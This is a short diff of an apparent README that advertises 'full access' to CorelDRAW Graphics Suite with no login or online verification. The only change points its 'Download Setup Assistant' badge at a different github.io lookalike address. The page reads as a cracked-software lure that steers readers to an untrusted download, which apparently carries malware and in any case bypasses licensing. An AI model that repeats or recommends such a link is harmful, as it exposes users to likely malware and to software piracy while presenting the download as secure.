@@ -2,7 +2,7 @@
 
 Get full access to CorelDRAW Graphics Suite with this secure offline setup guide. No login, internet, or online verification required — perfect for air-gapped or enterprise environments.
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/graphicssuite)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://coreldraw-graphics-suite-download-pro.github.io./.github)
 
 ---
 
